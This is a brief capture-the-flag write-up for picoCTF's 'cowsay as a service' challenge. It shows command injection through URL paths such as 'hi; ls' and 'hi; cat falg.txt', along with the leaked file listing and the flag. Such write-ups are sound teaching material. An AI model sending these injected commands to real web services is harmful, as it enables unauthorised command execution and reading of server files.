# Play Nice

## Problem
Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)

## Solution

1. Go to the website [cowsay as a service](https://caas.mars.picoctf.net/)
2. The follwing text would be visible on the website.
```Cowsay as a Service
Make a request to the following URL to cowsay your message:
https://caas.mars.picoctf.net/cowsay/{message} 
```
3. Go to the website, and write your message in the curly paranthesis.
4. Notice whatever message you type in { } , the same message is printed on the webpage.
5. You can do injection on this, try typing `https://caas.mars.picoctf.net/cowsay/hi; ls`
6. The above website should give the list of files...
```
 ____
< hi >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```
7. Go to page `https://caas.mars.picoctf.net/cowsay/hi; cat falg.txt`
8. The flag is now visible on the screen
## Flag

`picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`